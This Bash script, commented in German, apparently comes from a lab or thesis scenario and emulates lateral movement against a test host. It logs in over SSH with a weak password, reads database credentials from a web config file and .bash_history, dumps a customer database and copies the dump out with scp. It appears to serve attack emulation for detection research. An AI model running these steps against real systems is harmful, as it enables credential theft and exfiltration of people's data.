#!/usr/bin/env bash
# Szenario 3 - Lateral Movement mit Credential-Diebstahl. Mehrstufig.
# Der Angreifer pivotiert auf victim, findet die DB-Zugangsdaten und
# bewegt sich zum DB-Dienst. Single-Host-Vereinfachung (Kapitel 7).
#   E8 Credential-Zugriff | E9 Bewegung zum DB-Dienst | E10 DB-Dump | E11 Exfiltration
set -uo pipefail

VICTIM="${VICTIM_IP:-192.168.20.5}"
USER="${WEAK_USER:-sysops}"
PASS="${WEAK_PASS:-Sommer2025}"
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

on_victim() { sshpass -p "${PASS}" ssh ${SSH_OPTS} "${USER}@${VICTIM}" 'bash -s'; }

echo "[*] Szenario 3 - Start: $(date --iso-8601=seconds)"

echo "[E8] Credentials aus Web-Config und bash_history auslesen"
on_victim <<'REMOTE'
sudo cat /var/www/html/db.php
sudo cat /home/webapp/.bash_history
REMOTE

echo "[E9] Zugriff auf den DB-Dienst mit den erbeuteten Credentials"
on_victim <<'REMOTE'
mysql -u webapp -pWebApp123 firma -e "show tables; select count(*) from kunden;"
REMOTE

echo "[E10] Datenbank-Dump erstellen"
on_victim <<'REMOTE'
mysqldump -u webapp -pWebApp123 firma > /tmp/firma_dump.sql
ls -la /tmp/firma_dump.sql
REMOTE

echo "[E11] Dump vom victim herunterziehen (Exfiltration)"
sshpass -p "${PASS}" scp ${SSH_OPTS} "${USER}@${VICTIM}:/tmp/firma_dump.sql" /tmp/firma_dump.sql
ls -la /tmp/firma_dump.sql

echo "[*] Szenario 3 - Ende: $(date --iso-8601=seconds)"
